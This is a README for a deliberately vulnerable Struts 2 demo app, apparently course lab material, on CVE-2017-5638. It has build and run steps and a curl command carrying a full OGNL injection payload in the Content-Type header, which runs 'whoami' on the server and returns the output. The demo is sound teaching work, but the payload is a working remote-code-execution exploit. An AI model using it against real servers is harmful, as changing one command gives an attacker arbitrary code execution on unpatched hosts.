# SC3010 Struts 2 Vulnerability (CVE-2017-5638) demo

## Install and Start the server
Note: Please make sure your maven is running on java 8

1. Navigate to the Maven project
```
cd struts-vuln-demo
```
2. Build a Maven package
```
mvn clean package -DskipTests
```
3. Running directly on local machine
```
mvn jetty:run
```
4. Running on a container
```
docker build -t struts-app .
docker run -p 8080:8080 struts-app
```

## Usage
### Normal file upload (through browser)
1. Go to http://localhost:8080/struts-vuln-demo-1.0-SNAPSHOT/example/FileUpload.action (container) or http://localhost:8080/example/FileUpload.action (local)
2. Upload file. You should be able to view the SHA256 hash of the file, filename, and ContentType of the file
### Vulnerability test (using curl, please try to run this test with a containerized server for your own safety)
```
curl --location 'http://localhost:8080/struts-vuln-demo-1.0-SNAPSHOT/example/doUpload.action' \
--header 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
--header 'Accept-Language: en-US,en;q=0.9' \
--header 'Connection: keep-alive' \
--header 'Content-Type: ${(#_="multipart/form-data").(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context["com.opensymphony.xwork2.ActionContext.container"]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd="whoami").(#iswin=(@java.lang.System@getProperty("os.name").toLowerCase().contains("win"))).(#cmds=(#iswin?{"cmd.exe","/c",#cmd}:{"/bin/bash","-c",#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}' \
--header 'Cookie: JSESSIONID=13EC0C929279DC15527C2DC4E96675A0; JSESSIONID=1r1jbgllowar61qciw9v8yih8s' \
--form 'upload=@"/path/to/upload/file"'
```
The response should contain the user running the server process (equivalent to running `whoami` on terminal).

## Analysis, sources, etc.
https://docs.google.com/document/d/1i4Ny7hKPiCtBEydqR1caG-5aE361vGqd_ly_--CWMmU/edit?usp=sharing
